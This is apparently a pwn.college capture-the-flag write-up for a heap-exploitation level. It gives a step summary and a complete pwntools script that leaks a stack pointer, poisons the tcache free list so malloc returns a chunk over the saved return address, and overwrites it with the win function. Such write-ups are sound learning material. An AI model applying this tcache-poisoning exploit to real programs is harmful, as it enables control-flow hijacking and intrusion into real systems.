---
layout: post
title: (Dynamic Allocator Misuse) level 15
categories: pwn.college Dynamic-Allocator-Misuse
date: 2025-10-11 07:00:22 +0300
tags: pwn.college PIE ASLR heap house-of-force tecache metadata house-of-spirit
---
## Information
- category: pwn


## Description 
> Leverage TCACHE exploits to obtain the flag.

## Write-up

**Goal:** leak a return address from the stack, compute PIE base, pivot `malloc` so a chunk points at the return address, overwrite it with `win`, and trigger the return.

## Summary
1. Leak a stack pointer using an `echo` primitive.  
2. Compute the saved return address using a known offset from that leak.  
3. Force the next `malloc` to return a chunk that points at the return address.  
4. Use the chunk to leak PIE (from an offset near the return address) and compute `win`'s absolute address.  
5. Overwrite the saved return address in-place with `p64(win_addr)`.  
6. `quit`/return → execution jumps to `win`.

## Exploit
```python
from pwn import *

elf = context.binary = ELF("/challenge/ephemeral-echo-hard")
global p
p = elf.process()

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def echo(idx,offset):
    p.sendline(b"echo")
    p.sendline(idx)
    p.sendline(offset)

def read(idx,size,data):
    p.sendline(b"read")
    p.sendline(idx)
    p.sendline(size)
    p.sendline(data)

def quit():
    p.sendline(b"quit")

def exploit():
    malloc(b"0",b"0")

    echo(b"0",b"40")

    p.recvuntil(b"Data: ")
    stack = u64(p.recvline().strip().ljust(8,b"\x00")) + 0x176
    log.success(f"stack: {hex(stack)}")

    malloc(b"0",b"0")
    malloc(b"1",b"0")
    malloc(b"2",b"0")

    free(b"2")
    free(b"1")

    data = b"A"*0x20 + p64(stack)
    read(b"0",b"2008",data)

    malloc(b"0",b"0")
    malloc(b"0",b"0")

    echo(b"0",b"32")

    p.recvuntil(b"Data: ")
    win = u64(p.recvline().strip().ljust(8,b"\x00")) - 0x00000000000015ce + 0x0000000000001400
    log.success(f"stack: {hex(win)}")

    read(b"0",b"2008",p64(win))
    
    quit()

    p.interactive()
    
def main():
    exploit()

if __name__ == "__main__":
    main()
```
